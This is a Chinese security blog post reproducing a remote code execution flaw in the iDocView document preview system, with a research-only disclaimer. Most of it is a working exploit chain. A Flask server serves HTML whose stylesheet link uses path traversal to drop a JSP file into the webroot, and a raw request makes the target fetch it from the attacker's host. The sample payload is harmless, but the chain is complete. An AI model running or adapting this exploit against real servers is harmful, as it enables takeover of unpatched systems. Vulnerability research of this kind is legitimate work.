#  【0day】i Doc View 漏洞复现   
James  Panda安全   2023-11-24 00:55  
  
声明：该公众号分享的安全工具和项目均来源于网络，仅供安全研究与学习之用，如用于其他用途，由使用者承担全部法律及连带责任，与工具作者和本公众号无关。  
  
现在只对常读和星标的公众号才展示大图推送，建议大家把公众号“  
Panda安全”设为星标，否则可能看不到了！  
  
**0x00 漏洞介绍**  
  
I Doc View在线文档预览系统是由北京卓软在线信息技术有限公司开发的一套系统，用于在Web环境中展示和预览各种文档类型，如文本文档、电子表格、演示文稿、PDF文件等。  
  
攻击者可利用该漏洞使服务器下载恶意文件，获取服务器控制权限。经分析，该漏洞利用难度低，可造成远程代码执行，建议尽快修复。  
  
要求：出网  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bnErTOz08TjiaiaGIQia0huGsGBhWMMkWCiaAQ8OogJ3ZJCd9ltND5OQYfibxgeL4CRKuyiavJ319vBtbVcF2jNK4ZUg/640?wx_fmt=png&from=appmsg "")  
  
**0x01 影响版本******  
  
iDocView < 13.10.1_20231115  
  
**0x02 漏洞复现**  
  
flash.py  
```
from flask import Flask
app = Flask(__name__)

@app.route('/index.html')
def index():
  return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
  <title>title</title>
    <link rel="stylesheet" href="..\\..\\..\\docview\\aaaa.jsp">
</head>
<body>
</body>
</html>"""
@app.route('/..\\..\\..\\docview\\aaaa.jsp')
def jsp():
  return '''<% 
out.print("123");
%>'''

if __name__ == '__main__':
  app.run(host="0.0.0.0", port=39999)
```  
  
发送请求  
```
GET /html/2word?url=http://xxx.xxx.xxx.xxx:39999/index.html HTTP/1.1
Host: 127.0.0.1
Connection: close

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/bnErTOz08TjiaiaGIQia0huGsGBhWMMkWCiaflo45O5597Da3AIsydlZqNja6mU6CHjWKRr5LRsgEapibA7eMkExLEg/640?wx_fmt=png&from=appmsg "")  
  
